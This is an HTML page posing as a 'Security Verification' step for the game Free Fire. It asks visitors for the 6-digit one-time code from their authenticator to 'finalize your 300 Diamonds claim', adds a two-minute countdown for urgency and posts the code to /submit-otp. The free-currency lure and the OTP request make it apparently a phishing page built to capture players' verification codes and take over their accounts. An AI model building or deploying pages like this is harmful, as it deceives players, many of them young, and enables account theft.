<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Security Verification - Free Fire</title>
<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: 'Segoe UI', Arial, sans-serif;
}
body {
    min-height: 100vh;
    background: #0d0806;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 20px;
    color: white;
}
.bg-overlay {
    position: fixed;
    inset: 0;
    background: 
        radial-gradient(circle at 50% 50%, rgba(255, 145, 0, 0.45) 0%, rgba(15, 8, 5, 0.95) 80%),
        linear-gradient(180deg, #0c121e 0%, #2a1512 45%, #8f2d08 75%, #120907 100%);
    z-index: -1;
}
.card {
    width: 100%;
    max-width: 400px;
    background: rgba(25, 14, 10, 0.95);
    border: 2px solid #ffae2b;
    border-radius: 12px;
    padding: 35px 25px;
    text-align: center;
    box-shadow: 0 0 35px rgba(255, 119, 0, 0.5);
}
h1 {
    font-size: 22px;
    color: #ffca4b;
    margin-bottom: 12px;
}
p {
    font-size: 14px;
    color: #f5e1c8;
    margin-bottom: 20px;
    line-height: 1.5;
}
.timer {
    font-size: 28px;
    font-weight: bold;
    color: #5ceeff;
    margin-bottom: 20px;
    text-shadow: 0 0 10px rgba(0, 195, 255, 0.6);
}
input {
    width: 100%;
    padding: 14px;
    margin-bottom: 20px;
    border: 1px solid #ffaa2b;
    border-radius: 6px;
    background: rgba(10, 5, 3, 0.9);
    color: white;
    font-size: 20px;
    text-align: center;
    letter-spacing: 6px;
    outline: none;
}
input:focus {
    border-color: #5ceeff;
    box-shadow: 0 0 10px rgba(0, 195, 255, 0.4);
}
.verify-btn {
    width: 100%;
    padding: 14px;
    border: 1px solid #ffe082;
    border-radius: 6px;
    background: linear-gradient(180deg, #ffae00, #ff5e00);
    color: #1a0800;
    font-size: 16px;
    font-weight: 900;
    cursor: pointer;
    text-transform: uppercase;
}
.verify-btn:active {
    transform: scale(0.98);
}
.footer-note {
    margin-top: 20px;
    font-size: 11px;
    color: #a88c74;
}
</style>
</head>
<body>
<div class="bg-overlay"></div>
<div class="card">
    <h1>SECURITY VERIFICATION</h1>
    <p>Please enter the 6-digit OTP verification code sent to your authenticator / linked device to finalize your 300 Diamonds claim.</p>
    
    <div class="timer" id="countdown">02:00</div>

    <form action="/submit-otp" method="POST">
        <input type="text" name="otp" placeholder="••••••" maxlength="6" pattern="[0-9]{6}" required autocomplete="one-time-code">
        <button type="submit" class="verify-btn">Verify & Claim</button>
    </form>
    
    <div class="footer-note">WAITING FOR SECURE CODE INPUT</div>
</div>

<script>
let timeLeft = 120;
const countdownEl = document.getElementById("countdown");

const timerId = setInterval(() => {
    if (timeLeft <= 0) {
        clearInterval(timerId);
        countdownEl.textContent = "00:00";
        return;
    }
    timeLeft--;
    let minutes = Math.floor(timeLeft / 60);
    let seconds = timeLeft % 60;
    countdownEl.textContent = 
        (minutes < 10 ? "0" : "") + minutes + ":" + (seconds < 10 ? "0" : "") + seconds;
}, 1000);
</script>
</body>
</html>
